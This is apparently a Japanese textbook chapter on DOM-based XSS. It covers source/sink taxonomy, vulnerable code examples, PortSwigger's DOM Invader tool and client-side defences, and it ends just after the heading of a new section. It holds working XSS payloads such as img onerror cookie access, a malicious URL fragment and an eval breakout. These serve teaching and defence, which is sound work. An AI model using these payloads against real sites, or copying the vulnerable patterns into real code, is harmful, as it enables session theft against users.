# 第3章 DOMベースXSS ― source/sink体系・クライアントサイドJS解析・postMessage

## DOMベースXSSの基礎とDOM Invader導入

反射型・格納型のXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード」として解釈・実行されてしまう脆弱性）では、悪意ある入力は**必ず一度サーバを通り、サーバが組み立てたHTMLに載って**ブラウザへ返ってきます。ところがWebアプリケーションの主戦場がサーバ側テンプレートから**クライアント側のJavaScript**へと移った結果、「サーバは一切関与していないのに、ブラウザ内でだけXSSが成立する」という第三の類型が主役級の重要度を持つようになりました。これが本章のテーマ **DOMベースXSS（DOM-based XSS）** です。

本セクションは、この分野の事実上の標準教材である PortSwigger（Burp Suite の開発元）の2つの資料を精読・統合し、(1) DOMベースXSSの原理と source/sink の体系、(2) 手作業での発見がなぜ困難か、(3) その困難を一変させたツール **DOM Invader** の全体像、を初学者が原文なしで完全に理解できるところまで解説します。単なる用語集ではなく、「**なぜブラウザはその代入先で入力をコードとして実行してしまうのか**」という仕組みのレベルまで掘り下げることが本セクションの価値の中心です。

---

### 0. 本セクションの資料取得状況（透明性のための注記）

本セクションが典拠とする PortSwigger の2ページ（下記URL）は、執筆環境のネットワーク下り（egress）プロキシによって `portswigger.net` ドメインへの直接アクセスがブロックされ、ページ本文を直接取得（WebFetch）できませんでした。そこで **Web検索を通じて同一ページ・公式ドキュメント・多数の二次解説から本文テキスト・ソース/シンク一覧・具体例・DOM Invader の機能説明を復元**し、Webセキュリティの専門知識で補完・体系化しています。復元内容は原典に忠実になるよう努めていますが、PortSwigger の資料は継続的に更新されるため、最新版の細部（例文の値やブラウザ対応など）は必ず各出典URLでご確認ください。**2資料とも実質的内容を復元できたため、本セクションでは「取得不可」としては扱っていません。**

- 資料1（DOMベースXSSの source/sink 体系）: `https://portswigger.net/web-security/cross-site-scripting/dom-based`
- 資料2（DOM Invader の登場背景）: `https://portswigger.net/blog/introducing-dom-invader`

---

### 1. DOMベースXSSとは何か — 反射型・格納型との根本的な違い

#### 1.1 定義

**DOMベースXSS**とは、**ページ内で動くJavaScript（クライアント側スクリプト）が、攻撃者の操作できるデータを読み取り、それを無防備な形で「危険な代入先」に渡してしまう**ことで発生するXSSです。PortSwigger の定義を平易に言い換えると次のようになります。

> DOMベースXSS脆弱性は、JavaScript が「攻撃者が制御できる入力元（source）」からデータを取り、それを**動的なコード実行をサポートする代入先（sink）**——例えば `eval()` や `innerHTML`——に渡したときに発生する。

ここで登場する2語が本章を貫く最重要概念です。

- **source（ソース）**: 攻撃者が値を操作できる可能性のあるデータの**入口**。JavaScript のプロパティとして現れる。代表例は `location.search`（URLのクエリ文字列 `?...` を読むプロパティ）。「データがどこから来るか」を指す。
- **sink（シンク）**: 攻撃者が制御したデータが最終的に**実行・解釈される危険な代入先**。代表例は `innerHTML`（要素のHTML内容を書き換えるプロパティ）や `eval()`（文字列をJavaScriptコードとして実行する関数）。「データがどこへ行き着くか」を指す。

DOMベースXSSは、要するに **source から sink へ、攻撃者データがそのまま流れ込む（このデータの流れを「データフロー」と呼ぶ）**現象です。

> 出典: What is DOM-based XSS (cross-site scripting)? Tutorial & Examples — https://portswigger.net/web-security/cross-site-scripting/dom-based

#### 1.2 3類型の比較 — 「サーバを通るか」「HTMLに載るか」

XSSの3類型を、**攻撃文字列がどこを経由し、どこで“コード化”するか**という軸で並べると違いが鮮明になります。

| 類型 | 攻撃文字列の経路 | HTMLへの混入場所 | サーバは関与するか |
|---|---|---|---|
| **反射型XSS** | リクエスト → サーバ → 即座にレスポンスHTMLへ反射 | サーバ側 | する（サーバが出力する） |
| **格納型XSS** | リクエスト → サーバのDB等に保存 → 後で別の応答HTMLへ出力 | サーバ側 | する（保存・出力の両方） |
| **DOMベースXSS** | 攻撃者データ → **ブラウザ内のJavaScript** → sink | **クライアント側（DOM操作時）** | **しないことがある** |

**DOM（Document Object Model: ブラウザがHTMLを解析して作る、要素のツリー構造。JavaScript はこのツリーを読み書きしてページを動かす）** という名前が示すとおり、DOMベースXSSの“事件現場”はサーバが返したHTML文字列ではなく、**ブラウザがメモリ上に組み立てたDOMツリーを、JavaScript が実行時に書き換える瞬間**です。

#### 1.3 なぜこれが厄介なのか — 「サーバに届かない攻撃」という決定的特徴

DOMベースXSS最大の特異点は、**攻撃ペイロードがそもそもサーバへ送られないケースがある**ことです。仕組みを理解すると、この分野が「素朴なXSS」と質的に異なる理由が腑に落ちます。

URLの構造を思い出してください。

```
https://example.com/page?q=検索語#fragment
                        ^^^^^^^^  ^^^^^^^^
                        クエリ文字列  フラグメント（ハッシュ）
```

このうち **`#` 以降の「フラグメント（fragment、別名ハッシュ）」は、ブラウザがサーバへHTTPリクエストを送る際に送信されません**。これはHTTPの仕様レベルの挙動で、フラグメントは「同一ページ内のどこを表示するか」を示すブラウザ内部の情報だからです。

したがって、脆弱なコードが `location.hash`（フラグメントを読むソース）から入力を取っている場合、

- 攻撃ペイロードは**サーバのアクセスログに一切残らない**（インシデント調査で見つけにくい）。
- **サーバ前段のWAF（Web Application Firewall: アプリの手前で悪意ある通信を検知・遮断する装置）が原理的に無力**になる。WAFはサーバに届くリクエストしか見られないが、ペイロードはブラウザ内で完結している。
- サーバ側の出力エスケープ（テンプレートの自動エスケープなど）をどれだけ完璧にしても、**サーバはこの脆弱性に触れてすらいない**ので何の防御にもならない。

この「防御レイヤの死角」こそ、DOMベースXSSが現代のバグバウンティや高度なペネトレーションテストで重視される理由です。防御はクライアント側コードの中でしか行えません。

> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 2. source（ソース）— 攻撃者が制御できる入力の入口

「攻撃者が値を操作できる可能性のあるプロパティは、すべて潜在的なソース」です。PortSwigger が列挙する主要なソースを、なぜ攻撃者が制御できるのかという理由とともに整理します。

#### 2.1 URL 由来のソース（最重要）

| ソース | 何を読むか | なぜ攻撃者が制御できるか |
|---|---|---|
| `location`, `location.href` | URL全体 | 攻撃者が被害者に開かせるリンクのURLを自由に作れる |
| `location.search` | `?` 以降のクエリ文字列 | 同上。`?q=...` の値を仕込める |
| `location.hash` | `#` 以降のフラグメント | 同上。**かつサーバに届かない**（前述） |
| `location.pathname` | パス部分 | URLの一部として制御可能 |
| `document.URL` | URL全体（文字列） | `location` と同様 |
| `document.documentURI` | ドキュメントのURI | 同上 |
| `document.baseURI` | 基準URI（`<base>` の影響を受ける） | 同上 |

URL系ソースは、**「被害者に踏ませる一本のリンク」だけで攻撃が成立する**ため、実務上もっとも狙われます。

#### 2.2 URL以外のソース

| ソース | 何を読むか | なぜ攻撃者が制御できるか |
|---|---|---|
| `document.referrer` | 直前に居たページのURL | 攻撃者が用意した中継ページから遷移させれば、Referer を任意に設定できる |
| `document.cookie` | Cookie文字列 | 別経路（他の脆弱性やサブドメイン）でCookieを書ければ制御可能 |
| `window.name` | ウィンドウ/タブに付いた名前 | **タブをまたいでも残る**特殊な文字列。攻撃者ページで `window.name` を設定してから遷移させると値を運べる（クロスオリジンでも保持される点が悪用される） |
| `postMessage` の `message` イベント（`event.data`） | 別ウィンドウ/iframe から送られてきたメッセージ本文 | 攻撃者のページから `postMessage()` で任意のデータを送り込める（第7章の Web メッセージ攻撃で詳述） |
| `history.pushState` / `history.replaceState` の引数 | 履歴に積んだ状態やURL | スクリプトが履歴に書いた値を読み戻す場合に間接的に制御されうる |
| `localStorage` / `sessionStorage` | ブラウザ内の永続/セッションストレージ | 別の脆弱性やスクリプトで書き込めれば汚染源になる（HTML5-storage manipulation） |
| Web SQL / IndexedDB | クライアント側DB | 同上 |

> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based
> 出典: DOM-based vulnerabilities — https://portswigger.net/web-security/dom-based

> **重要な原則**: ソースそのものは「危険」ではありません。危険なのは、**ソースの値がサニタイズ（入力に含まれる危険な文字列を無害な形へ変換・除去する処理）されないまま sink に届く**ことです。ソースを見つけたら、その値がコード中でどこへ流れるか（＝どの sink に到達するか）を追跡するのが分析の本質です。

---

### 3. sink（シンク）— 危険な代入先と、その「発火の仕組み」

sink は「攻撃者データが渡ると望ましくない効果を引き起こす、危険なJavaScript関数やDOMオブジェクト」です。DOMベースXSSでは、sink はおおむね次の3系統に分かれます。**なぜそこで発火するのか**という仕組みが重要なので、系統ごとに原理を説明します。

#### 3.1 系統A: HTMLとして再解釈される sink（HTMLパース系）

代入した文字列を、ブラウザの **HTMLパーサ（HTML構文解析器: 文字列を読んでDOMツリーへ変換する部品）が「新しいHTML」として解釈し直す** sink です。ここが最頻出です。

| sink | 挙動 |
|---|---|
| `element.innerHTML` | 要素の中身を、渡された文字列を**HTMLとして解析**して置き換える |
| `element.outerHTML` | 要素自身を含めてHTMLとして置き換える |
| `element.insertAdjacentHTML()` | 指定位置に文字列をHTMLとして挿入する |
| `document.write()` / `document.writeln()` | ドキュメントストリームへ文字列を書き出し、HTMLとして解析させる |
| `element.setAttribute()` の一部 / `srcdoc` など | 属性値・埋め込みドキュメントとして解釈される |

**発火の仕組み（最重要）**: `innerHTML = '<b>x</b>'` のように文字列を代入すると、ブラウザはその文字列を単なるテキストではなく**HTMLソースコードとして読み直し**、`<b>` を要素ノードに変換してDOMツリーへ組み込みます。この「文字列 → DOM要素」の再解釈の過程で、攻撃者が仕込んだイベントハンドラ属性（`onerror` など）や危険なタグが**正規のHTML要素として生成され、ブラウザのイベント機構に登録される**ため、コードとして動き出すのです。

> **落とし穴（試験に出る仕組み）**: `innerHTML` に `<script>alert(1)</script>` を入れても**スクリプトは実行されません**。これはHTML仕様で「パーサ挿入以外の経路で後から挿入された `<script>` 要素は実行しない」と定められているためです。だからこそ攻撃者は `<script>` を使わず、**`<img src=1 onerror=alert(1)>` のように「読み込み失敗イベントで発火するタグ」**を使います。存在しない画像 `src=1` の読み込みは必ず失敗し、`onerror` ハンドラが呼ばれる——この「必ず失敗する」性質を逆手に取るのが定石です。

#### 3.2 系統B: 文字列をコードとして実行する sink（JavaScript実行系）

渡された文字列を、そのまま**JavaScriptソースコードとして評価・実行**してしまう sink です。HTMLパースを経由しないぶん、より直接的です。

| sink | 挙動 |
|---|---|
| `eval()` | 引数の文字列をJavaScriptとして実行 |
| `Function()`（`new Function(...)`） | 文字列から関数を生成して実行可能にする |
| `setTimeout()` / `setInterval()` / `setImmediate()` | **第1引数が文字列だと**、それをコードとして評価して実行する |
| `execCommand` / `execScript` / `msSetImmediate` | レガシー環境でのコード実行経路 |
| `range.createContextualFragment()` | 文字列をHTML断片としてDOM化（HTMLパース系の性質も併せ持つ） |

**発火の仕組み**: `eval("alert(1)")` は、JavaScriptエンジンが引数の文字列を新しいソースコードとしてコンパイルし、その場のスコープで走らせます。`setTimeout("alert(1)", 100)` のように**関数ではなく文字列を渡すと、内部的に `eval` 相当の評価が起きる**点が盲点です（関数を渡せば安全）。

#### 3.3 系統C: ナビゲーション/URL系 sink（`javascript:` スキーム）

| sink | 挙動 |
|---|---|
| `location` / `location.href` / `location.assign()` / `location.replace()` | 遷移先URLとして解釈。`javascript:alert(1)` のような**擬似スキーム**を入れられるとコード実行 |
| `a.href`, `iframe.src`, `form.action` などのURL属性 | 同上（`javascript:` URLで発火しうる） |

**発火の仕組み**: ブラウザは `javascript:` で始まるURLへの遷移を「そのコードを実行せよ」という命令として扱います。攻撃者が遷移先URLを制御できれば、`javascript:` スキームでコード実行に持ち込めます（DOM-based JavaScript injection や open redirection と地続きの領域）。

#### 3.4 系統D: jQuery など JavaScript ライブラリの sink

ライブラリの便利関数が、内部で `innerHTML` 相当の処理を呼ぶために sink になります。PortSwigger が挙げる jQuery の代表的な sink:

```
$() / jQuery()（セレクタにHTML文字列を渡した場合）
.html()
.append() / .prepend() / .after() / .before() / .replaceWith() / .replaceAll()
.wrap() / .wrapInner() / .wrapAll()
.add() / .insertAfter() / .insertBefore()
$.parseHTML() / jQuery.parseHTML()
```

**jQuery `$()` の危険な仕組み（頻出）**: `$(x)` は通常「CSSセレクタで要素を探す」関数ですが、jQuery は**引数の文字列が `<` で始まると「これはHTMLだ」と判断してその場でHTML要素を生成**します。したがって `$(location.hash)` のようなコードは、`#<img src=1 onerror=alert(1)>` というフラグメントを与えられると、セレクタ検索のつもりが**新しい要素の生成＝コード実行**に化けます。

> 出典: DOM-based JavaScript injection（sink一覧） — https://portswigger.net/web-security/dom-based/javascript-injection
> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 4. 具体的なコード例・ペイロード例（原理つき）

ここまでの source/sink を、PortSwigger の代表例で具体化します。各例に「**なぜ動くのか**」を必ず添えます。

#### 4.1 `innerHTML` sink（最も基本的なDOM XSS）

脆弱なコード:

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

このコードは検索語をそのまま `innerHTML` に連結しています。値が URL の `location.search` などから来ていて攻撃者が制御できるなら、次のような値を注入します。

```html
You searched for: <img src=1 onerror='alert(document.cookie)'>
```

**なぜ動くのか**: `innerHTML` への代入時にブラウザのHTMLパーサが文字列を再解釈し、`<img>` を実要素として生成する。`src=1` は必ず読み込みに失敗するため `onerror` イベントが確実に発火し、そこに書いた任意のJavaScript（ここでは Cookie を盗む `alert(document.cookie)`）が実行される。`<script>` ではなく `<img onerror>` を使うのは、§3.1 で述べたとおり `innerHTML` 経由の `<script>` はブラウザが実行しない仕様だから。

#### 4.2 `document.write()` sink

脆弱なコード（検索クエリをページに書き戻す典型例）:

```javascript
document.write('<p>検索結果: ' + location.search.slice(3) + '</p>');
```

URLを `?q=<img src=1 onerror=alert(1)>` のようにして誘導すると、`document.write` が組み立てたHTML文字列がそのままパースされ、`onerror` が発火します。

**なぜ動くのか**: `document.write()` は引数をドキュメントストリームへ流し込み、HTMLパーサに解析させる。ソース `location.search` の値が無検証で連結されているため、攻撃者のタグがそのままDOM化して実行される。`document.write` が `<select>` 要素の内側など「特定の親要素の中」で使われている場合は、まず `</select>` などで文脈（コンテキスト）を抜けてからペイロードを置く、という**コンテキスト脱出**が必要になる（PortSwigger の該当ラボはこの一手間を学ばせる設計）。

#### 4.3 jQuery セレクタ `$()` を悪用する例

古典的な脆弱パターン:

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element.scrollIntoView();
});
```

攻撃URL:

```
https://vulnerable-website.com/#<img src=1 onerror=alert(document.cookie)>
```

**なぜ動くのか**: フラグメントが変わると `hashchange` が発火し、`$(location.hash)` が呼ばれる。`location.hash` の値が `<` で始まるため、jQuery はセレクタ検索ではなく**HTML要素生成**を行い、`<img onerror>` が実行される。

> **バージョン依存の注意（陳腐化への警戒）**: この攻撃が「被害者の操作なしで自動発火」するかは jQuery のバージョンに依存する。**jQuery 1.9.0（2013年公開）より前**は `$()` が `#` を含む文字列でもHTMLとして扱いやすく、ページを開くだけで発火しえた。1.9.0以降は挙動が厳格化され、多くの場合ワンクリック等のユーザー操作を要する。現場で古い jQuery を見たら、この差を必ず意識すること。

#### 4.4 `eval()` / `JSON.parse` 周辺の例

脆弱なコード（クエリからJSONを読もうとして `eval` を使ってしまう悪例）:

```javascript
var data = eval('(' + location.search.slice(3) + ')');
```

`?x={});alert(1);({` のような入力で、`eval` がコードとして評価し `alert(1)` が走ります。

**なぜ動くのか**: `eval` は引数文字列を無条件にJavaScriptとしてコンパイル・実行する。攻撃者は JSON のふりをした文字列の中に文をねじ込み、括弧のバランスを調整してコードを紛れ込ませる。正しくは `JSON.parse()`（データとしてのみ解釈し、コードは実行しない）を使うべきで、`eval` を JSON パースに使うこと自体がアンチパターン。

---

### 5. DOMベースXSS以外の「DOM系脆弱性」全体像

PortSwigger は、DOM XSS を「攻撃者データが source → sink へ流れて悪影響を及ぼす」という同じ枠組みで捉えられる**DOM系脆弱性ファミリー**の一員として位置づけています。sink が変われば影響も変わる、という発想です。学習者はこの地図を押さえておくと、実務で「XSSにはならないが別の被害が出る」ケースを見逃さずに済みます。

| 脆弱性の種類 | 典型的な sink | 何が起きるか（影響） |
|---|---|---|
| **DOM-based XSS** | `innerHTML`, `eval`, `document.write`, jQuery `html()` 等 | 任意のJavaScript実行 |
| **DOM-based open redirection**（オープンリダイレクト） | `location`, `location.href`, `location.assign()`, `location.replace()`, `open()`, `element.srcdoc`, `XMLHttpRequest.open()`, `$.ajax()` | 攻撃者サイトへ強制遷移（フィッシング等） |
| **DOM-based cookie manipulation**（Cookie操作） | `document.cookie` | Cookie を攻撃者値で上書き。セッション固定や他攻撃の足場 |
| **DOM-based JavaScript injection** | `eval`, `Function`, `setTimeout`（文字列）等 | コード実行（XSSと重なる） |
| **DOM-based document-domain manipulation** | `document.domain` | 同一オリジンポリシーの境界を緩めさせられる |
| **DOM-based WebSocket-URL poisoning** | `WebSocket` コンストラクタ | WebSocket接続先を攻撃者サーバへ差し替え |
| **DOM-based link manipulation**（リンク操作） | `a.href`, `element.src` 等 | 正規リンクを差し替え |
| **DOM-based web-message manipulation** | `postMessage()` の宛先 | 別ウィンドウへ悪意あるメッセージ送信 |
| **DOM-based Ajax request-header manipulation** | `setRequestHeader()` | リクエストヘッダを汚染 |
| **DOM-based local file-path manipulation** | `FileReader.readAsText()` 等 | 読み込むファイルパスを操作 |
| **DOM-based client-side SQL injection** | Web SQL の `executeSql()` | クライアント側DBへSQLi |
| **DOM-based HTML5-storage manipulation** | `localStorage.setItem()`, `sessionStorage.setItem()` | ストレージ汚染（後続のDOM XSSの source になりうる） |
| **DOM-based client-side XPath injection** | `document.evaluate()`, `element.evaluate()` | XPathクエリ改ざん |
| **DOM-based client-side JSON injection** | `JSON.parse()` 等（生成側） | JSON構造の改ざん |
| **DOM-based DOM-data manipulation** | フォームフィールドの値やリンク等 | 表示データやフォーム挙動の改変 |
| **DOM-based denial of service**（DoS） | `RegExp`（ReDoS）, `requestFileSystem` 等 | クライアント側のリソース枯渇・機能停止 |

> 出典: DOM-based vulnerabilities（種類とsink一覧） — https://portswigger.net/web-security/dom-based
> 出典: DOM-based open redirection — https://portswigger.net/web-security/dom-based/open-redirection
> 出典: DOM-based WebSocket-URL poisoning — https://portswigger.net/web-security/dom-based/websocket-url-poisoning

このファミリー観の実務的な含意は明快です。**「その sink はコード実行に至るか？」を毎回問う**こと。至るなら XSS、至らないなら別カテゴリの被害を評価する、という切り分けができるようになります。

---

### 6. どうやって見つけるか — 手作業の限界と、ツールが必要な理由

#### 6.1 手作業のアプローチ

原理的には、DOM XSS の探索は次の手順です。

1. ページで動く**全JavaScriptを読み、各ソース（`location` 等）が参照されている箇所を洗い出す**。
2. そのソースの値が代入・連結・関数呼び出しを経て**どこへ流れるか（データフロー）を追跡**する。
3. 途中でサニタイズされずに**危険な sink に到達していれば脆弱**。
4. sink に届く形に合わせてペイロードを組み立て、コンテキスト脱出などを施して発火させる。

#### 6.2 なぜ DOM XSS は「3類型で最も難しい」のか

PortSwigger は DOM XSS を **「反射型・格納型・DOM型のうち、発見と攻撃が飛び抜けて難しい」** と明言しています。その理由が、次のツール登場の必然性を説明します。

- **コードが人間可読でない**。本番のJavaScriptは**ミニファイ（minify: 空白・改行・意味のある変数名を削って圧縮した状態）**され、しばしば**難読化**されている。ソースからsinkへの流れが**数千行**に散らばり、変数名も `a`, `b`, `c` のように潰れている。
- **フレームワークが sink を隠す**。jQuery や各種SPA（Single Page Application）フレームワークの内部で `innerHTML` 相当が呼ばれるため、表面のコードを見ても sink が見えない。
- **サーバに痕跡が残らない**（§1.3）。したがってプロキシでリクエスト/レスポンスを眺める従来型の手法だけでは、ブラウザ内で完結するフローを捉えきれない。

結果として、DOM XSS の手作業探索は「複雑なJavaScriptの中で入力の流れを延々と手で追う、退屈で骨の折れる作業」になります。**この作業を、あたかも反射型XSSを探すかのように簡単にする**ために作られたのが DOM Invader です。

> 出典: Introducing DOM Invader: DOM XSS just got a whole lot easier to find — https://portswigger.net/blog/introducing-dom-invader

---

### 7. DOM Invader 導入 — DOM XSS 探索を一変させたツール

#### 7.1 DOM Invader とは何か・登場の背景

**DOM Invader** は、PortSwigger が **2021年6月30日** に発表した、Burp Suite 向けの新ツールです。ブログ記事のタイトルそのものが主張になっています——「**DOM XSS just got a whole lot easier to find（DOM XSS の発見が一気に簡単になった）**」。

背景にあるのは §6.2 で見た「DOM XSS は手作業では非常に見つけにくい」という長年の問題です。従来もブラウザの開発者ツール（DevTools）でブレークポイントを張って追う、あるいは古い専用ツールを使う、といった方法はありましたが、いずれも熟練と根気を要しました。DOM Invader はこの探索を、**Burp に組み込まれたブラウザ（Burp's embedded browser: Chromium ベースの内蔵ブラウザ）に載る拡張機能**として実装し、探索の大部分を自動化・可視化します。

**重要な特徴**: DOM Invader は **Burp Suite Professional（有償版）だけでなく Community Edition（無償版）でも利用できる**、内蔵ブラウザの標準機能です。高価なライセンスがなくても DOM XSS の体系的探索ができる、という点が学習者にとって大きな意味を持ちます。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader
> 出典: DOM Invader（Burp ドキュメント） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader

#### 7.2 中核機能1: canary（カナリア）

**canary（カナリア）** とは、**ユーザー入力が sink まで届いているかを追跡するための、目印になるユニークな文字列**です（炭鉱のカナリア＝危険の察知役、が語源）。

使い方の原理はこうです。攻撃者（テスター）は canary（例: ランダムな `dom0invader1234` のような文字列。既定ではランダム生成だが任意の値に変更可能）を、テストしたいソース——URLのクエリパラメータやフラグメントなど——に入れます。DOM Invader は**この canary がページ内でどの sink に到達したかを検出**し、「あなたの入力はこの危険な代入先まで届いています」と教えてくれます。

**なぜ有効か**: 反射型XSSでは「入力した目印文字列がレスポンスHTMLのどこに出るか」を見て反射点を探します。canary はこの発想を DOM の世界へ持ち込むもので、**数千行のJSを手で追う代わりに、目印が sink に着いたかどうかを機械に判定させる**ことができます。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

#### 7.3 中核機能2: Augmented DOM（拡張DOM）

**Augmented DOM（拡張DOM）** は、Burp 内蔵ブラウザの DevTools に追加される専用タブで、**そのページに存在する source と sink をツリー状に一覧表示**します。canary を含む source/sink はハイライトされ、どのソースがどの sink につながっているかを俯瞰できます。

PortSwigger 自身がこの機能の意義を次のように表現しています。

> Augmented DOM を使えば、**DOM XSS をあたかも反射型XSSであるかのように見つけられる**。

**なぜ画期的か**: 従来は「JavaScript を読んで source→sink のデータフローを頭の中で再構築する」必要がありました。Augmented DOM は**そのデータフローの結果（どのソースがどの sink に届いているか）をツリーとして直接提示**するため、コード読解というボトルネックを丸ごと省けます。各 sink アクセスをクリックすると、それが**どこから呼ばれたか（スタックトレース: 関数呼び出しの経路）**を DevTools コンソールで確認でき、脆弱箇所の特定が容易になります。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

#### 7.4 中核機能3: Web メッセージ（postMessage）のテスト

DOM Invader は、ページ上で `postMessage()` により送受信される **Web メッセージ**を**記録・改変・再送**できます。専用のメッセージタブで、飛び交うメッセージを観測し、内容を書き換えて送り直すことで、**Web メッセージ由来の DOM XSS**（送られてきた `event.data` が sink に流れるパターン。第7章で詳述）を効率的に検証できます。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader
> 出典: Testing for DOM XSS using web messages — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages

#### 7.5 実際の使い方（基本フロー）

1. Burp を起動し、**内蔵ブラウザ**を開く。DevTools（開発者ツール）から DOM Invader を有効化する。
2. canary を設定する（既定のランダム値でよい）。
3. テスト対象サイトを開き、**canary を URL のクエリやフラグメント等のソースに差し込む**。
4. DevTools の **Augmented DOM タブ**を開き、canary が到達した source/sink を確認する。危険な sink（`innerHTML`, `eval` 等）に届いていれば有望。
5. sink アクセスのスタックトレースで、脆弱なコード箇所を特定する。
6. その sink の性質に合わせてペイロード（`<img src=1 onerror=...>` 等）を組み立て、発火を確認する。ページ遷移（リダイレクト）が絡む場合も DOM Invader が状態を追随する。

#### 7.6 その後の進化（バージョン注記 — 陳腐化への注意）

2021年の初版ブログが扱った中核は **canary / Augmented DOM / Web メッセージ**の3本柱でした。その後 DOM Invader は継続的に強化され、**プロトタイプ汚染（prototype pollution: JavaScript のオブジェクトの“親テンプレート”を汚染して挙動を乗っ取る攻撃。第4章で詳述）の自動検出**（Burp 2022 系のリリースで追加）や、クライアント側の各種検査機能が加わりました。本セクションの主眼である「登場背景と基礎機能」は初版ブログに基づきますが、**実際にツールを使う際は必ず最新版のドキュメントで現行機能を確認**してください（ツールは頻繁に更新されます）。

> 出典: DOM Invader（Burp ドキュメント、最新機能一覧） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> 出典: Testing for prototype pollution with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/prototype-pollution

---

### 8. 防御 — クライアント側でしか守れない

DOM XSS の防御は、§1.3 で述べたとおり**サーバ側では完結できません**（サーバに届かない攻撃があるため）。防御はJavaScriptコードの内側で行う必要があります。PortSwigger の原則と実務のベストプラクティスをまとめます。

1. **そもそも危険な sink に、攻撃者制御データを渡さない**。これが最上位の原則。動的にHTMLを組み立てる必要が本当にあるかを問い直す。
2. **安全な代替 sink を使う**。テキストを表示したいだけなら `innerHTML` ではなく **`textContent`**（渡した文字列を必ずプレーンテキストとして扱い、HTMLとして解釈しない）を使う。これだけで大多数の innerHTML 由来 DOM XSS は消える。
3. **どうしてもHTMLを動的生成するなら、コンテキストに応じたエスケープ／サニタイズを施す**。HTML文脈・属性文脈・JavaScript文脈・URL文脈で必要な処理は異なる（詳細は第2章のコンテキスト別対策を参照）。
4. **信頼できるサニタイズライブラリを使う（自作しない）**。事実上の標準は **DOMPurify** で、HTMLをパースして危険な要素・属性を除去する。
   > **バージョン依存の注意（重要）**: DOMPurify は繰り返しバイパス（回避手法）が発見され、その都度修正されてきた。例えば **DOMPurify 2.0.17（2020年公開）より前**のバージョンには既知のバイパスが存在し、古いバージョンをそのまま使い続けると防御が破られる。特に **mXSS（mutation XSS: ブラウザがDOMを再シリアライズ／再パースする際にHTMLが“変異”して、サニタイズ後に危険な形へ化ける現象。名前空間の切り替え〔HTML/SVG/MathML〕を悪用するものが有名）** による名前空間混同バイパスは近年も複数報告されている。**DOMPurify は必ず最新版に追従し、更新を怠らないこと**。（mXSS の仕組みは第5章で詳述。）
5. **Trusted Types を導入する**。**Trusted Types** は、`innerHTML` などの危険な sink へ渡せる値を「検証済みの特別な型（TrustedHTML など）」に限定するブラウザ機構で、CSP（Content Security Policy）ヘッダ `require-trusted-types-for 'script'` で有効化する。**生の文字列を sink に渡すこと自体をブラウザレベルで禁止**できるため、DOM XSS を構造的に封じる強力な多層防御になる（対応ブラウザは Chromium 系が中心。詳細は防御の章を参照）。
6. **`eval` / `Function` / 文字列引数の `setTimeout` を使わない**。JSONは必ず `JSON.parse()` で扱う。

> 出典: What is DOM-based XSS?（防御セクション） — https://portswigger.net/web-security/cross-site-scripting/dom-based
> 出典: DOM-based vulnerabilities（防御の一般原則） — https://portswigger.net/web-security/dom-based

---

### 9. 本セクションのまとめ

- **DOMベースXSS**は、サーバではなく**ブラウザ内のJavaScript**が、攻撃者制御データ（**source**）を危険な代入先（**sink**）へ無検証で渡すことで起きる。`location.hash` を使う型は**サーバに届かず**、WASやサーバ側エスケープが原理的に無力になる点が決定的な特徴。
- **source** はURL系（`location.*`, `document.URL`）を筆頭に、`document.referrer`, `window.name`, `postMessage`, ストレージなど多岐にわたる。**sink** はHTMLパース系（`innerHTML`, `document.write`）、コード実行系（`eval`, 文字列 `setTimeout`）、URL系（`javascript:`）、ライブラリ系（jQuery `$()`, `.html()`）に大別できる。
- 発火の核心は**ブラウザによる再解釈**——文字列をHTMLパーサがDOM要素に変換する（`onerror` 発火）、あるいはJSエンジンがソースとしてコンパイルする——という仕組みにある。`innerHTML` 経由の `<script>` が動かない一方 `<img onerror>` が動く理由も、この仕組みから導ける。
- DOM XSS は3類型で最も発見が難しい。ミニファイ／難読化された数千行のJSでデータフローを手追いする作業を、**DOM Invader**（2021年、Burp 内蔵ブラウザの拡張。Community 版でも利用可）が **canary・Augmented DOM・Web メッセージ**機能で「反射型XSSのように」簡単にした。
- 防御はクライアント側でしか完結しない。`textContent` への置き換え、DOMPurify（**最新版必須**）、Trusted Types が主力。`eval` 系は排除する。

次セクション以降では、ここで俯瞰した DOM 系脆弱性の各論——Web メッセージ、プロトタイプ汚染、mXSS——を、それぞれの発火メカニズムまで掘り下げて扱います。

---

## DOM Invader実践（Burp公式ドキュメント）

このセクションでは、PortSwigger（Burp Suite の開発元）が提供するブラウザ内蔵ツール **DOM Invader（ドム・インベーダー）** を使って、DOM ベース XSS（クロスサイトスクリプティング）を体系的に発見・検証する方法を、公式ドキュメントに沿って詳しく解説する。DOM ベース XSS の理論（source と sink、データフロー）は本章の前節までで扱った前提知識とし、ここでは「実際にどう見つけるか」という実務に踏み込む。

> ℹ️ **本セクションの資料取得についての注記**
> 執筆にあたり、指定された PortSwigger 公式ドキュメント 3 本を直接取得しようとしたが、実行環境のネットワーク制限（egress プロキシによる `portswigger.net` へのアクセス遮断）により本文の直接取得ができなかった。そのため、手順の指示に従い WebSearch による検索結果のスニペット・二次言及から各ページの技術的内容を復元して記述している。復元により各ページの実質的な内容（機能一覧・手順・ペイロード例）は得られたため「取得不可」扱いにはしていないが、UI の細部（最新版でのボタン名の変更など）は原典と差異が生じる可能性があるため、各小節末尾の出典 URL をご自身でも確認されたい。

---

### DOM Invader が解決する問題 — なぜ専用ツールが要るのか

